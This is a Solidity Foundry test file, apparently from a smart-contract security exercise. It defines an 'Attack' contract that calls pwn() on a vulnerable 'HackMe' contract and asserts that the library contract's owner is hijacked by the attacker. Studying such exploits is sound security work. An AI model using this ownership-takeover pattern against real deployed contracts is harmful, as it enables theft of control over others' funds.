// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/HackMe.sol";

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

contract HackMeTest is Test {
    uint256 public privateKey = 1234;
    address public signer;
    HackMe public hackMe;
    Lib public lib;
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.startPrank(signer);
        lib = new Lib();
        hackMe = new HackMe(lib);
        vm.stopPrank();
    }

    function test_steal_owner() public {
        assertEq(lib.owner(), address(0));
        vm.startPrank(exploiter);
        Attack attack = new Attack(address(hackMe));
        attack.attack();
        assertEq(lib.owner(), address(attack)); // Don't know why it is not exploiter
    }
}